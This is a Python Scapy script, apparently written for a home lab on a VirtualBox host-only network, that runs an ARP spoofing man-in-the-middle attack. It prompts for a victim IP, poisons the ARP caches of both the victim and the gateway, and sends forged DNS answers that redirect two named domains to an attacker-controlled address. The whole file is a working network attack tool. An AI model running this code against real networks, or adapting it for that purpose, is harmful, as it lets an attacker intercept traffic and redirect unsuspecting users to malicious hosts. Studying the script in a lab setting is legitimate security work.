from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP
import threading
import netifaces
import logging


# Suppress WARNING Message and display only Error Message
conf.logLevel = logging.ERROR
INTERFACE = conf.iface 

# Interface to use for the attack

# Malicious DNS records
MALICIOUS_DNS_RECORDS = {
    "poop.com.": "192.168.56.12", 
    "httpforever.com.": "192.168.56.12"
}

stop_thread = threading.Event()

def discover_hosts(network):
    """
    Discover hosts in the network by sending ARP requests.
    :param network: Network to scan, e.g., '192.168.1.0/24'
    :return: List of tuples (IP, MAC) of discovered hosts
    """
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
    answered, _ = srp(arp_request, timeout=2, verbose=False)
    hosts = []
    for sent, received in answered:
        hosts.append((received.psrc, received.hwsrc))
    return hosts



def get_default_gateway():
    """
    Get the default gateway IP for the active network interface.
    :return: Default gateway IP
    """
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    return default_gateway


def get_mac(ip):
    """
    Get the MAC address for a given IP.
    :param ip: IP address to resolve
    :return: MAC address
    """
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(arp_request, timeout=1, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None


# Function to perform ARP spoofing
def arp_spoof(target_ip, spoof_ip):
    global stop_thread
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC address for IP {target_ip}")
        return
    try:
        while not stop_thread.is_set():
            send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=False)
    except Exception as e:
        print(f"Error during ARP spoofing: {e}")


#function to send modified dns query
def dns_responder(packet):
    try:
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
            queried_domain = packet[DNSQR].qname.decode()
            if queried_domain in MALICIOUS_DNS_RECORDS:
                # Pre-compiled part of the response
                response_base = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                UDP(dport=packet[UDP].sport, sport=53)
                # Create and send the DNS response
                response = response_base / DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                               an=DNSRR(rrname=packet[DNSQR].qname, ttl=10,
                                                        rdata=MALICIOUS_DNS_RECORDS[queried_domain]))
                send(response, iface=INTERFACE, verbose=False)
                print(f"{queried_domain} DNS Response Sent!")
            else:
                # Forward DNS queries not in the malicious records
                send(packet.payload, iface=INTERFACE, verbose=False)
        else:
            # Forward Other Packets if not important to the attack
            send(packet.payload, iface=INTERFACE, verbose=False)
    except Exception as e:
        print(f"Error processing packet: {e}")


def main():
    global stop_thread
    try:
        victim_ip = input("victims ip: ")
        print("\nStarting Attack...")
        
        network = "192.168.56.0/24"  # Adjust to your network
        hosts = discover_hosts(network)
        router_ip = get_default_gateway()
        

        # Start ARP spoofing in separate threads
        victim_thread = threading.Thread(target=arp_spoof, args=(victim_ip, router_ip))
        router_thread = threading.Thread(target=arp_spoof, args=(router_ip, victim_ip))

        victim_thread.start()
        router_thread.start()

        for ip, mac in hosts:
            if ip == router_ip:
                print(f"Router IP: {ip}, MAC: {mac}")
            else:
                print(f"Host IP: {ip}, MAC: {mac}")

        # Sniff DHCP packets and apply interception, and also handle DNS responses
        sniff(prn=dns_responder, iface=INTERFACE)
    except Exception as e:
        print(f"An error occurred: {e}")
    
if __name__ == "__main__":
    main()
